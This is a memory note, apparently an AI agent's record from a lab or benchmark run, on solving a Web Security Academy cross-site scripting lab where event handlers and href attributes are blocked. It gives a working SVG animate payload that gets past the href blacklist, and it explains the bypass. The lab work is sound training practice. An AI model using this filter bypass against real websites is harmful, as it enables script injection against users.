---
metadata:
  node_type: memory
name: "PRS arm A lab-event-handlers-and-href-attributes-blocked"
description: "arm A 基线:lab-event-handlers-and-href-attributes-blocked 冷实例一次通过 - SVG animate attributeName=href values=javascript:alert(1) 值写入绕过 href 黑名单,<text>Click me</text> 满足诱导点击,page_alert --click 'svg a' fired=true,banner solved"
last_updated: 2026-10-09T00:33:49+08:00
created: 2026-10-09T00:33:49+08:00
---

## 2026-10-09 arm A 基线:lab-event-handlers-and-href-attributes-blocked

- 实例:page_read canonical 路径直取 lab_id `8D3B6A32…E46CB8` → range_launch(reused:false)→ https://0acf00e803067f1a800e762c00df001b.web-security-academy.net/
- 反射点:GET /?search=<payload> → `<h1>0 search results for '<payload>'</h1>(HTML 上下文,单引号内)
- 约束:题面声明「whitelisted tags + 全部事件属性与锚点 href 属性被拦」⇒ on* 事件面与 `<a href=...>` 都用不了
- 解法(一次通过):`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`
  - 绕法:`href` 属性名被黑名单拦,但 `<animate attributeName=href>` 是把 href 作为「值」写入,黑名单不覆盖;SVG `<a>` + `<text>` 文本含 "Click" 满足题面「vector 须含单词 Click 诱导模拟用户点击」
  - 触发:page_alert --click 'svg a' → alerts ["alert:1"],fired:true
- 判定:banner_verdict solved=true,congrats「Congratulations, you solved the lab!」(反射型 lab 的 solved 在载荷执行后即落地,无需 exploit server)
- 件:page_read / range_launch / page_alert(--click) / banner_verdict,无需新件
- 坑:http_session 会剥 script 块,反射槽看起来可能为空,勿据此判「无反射」

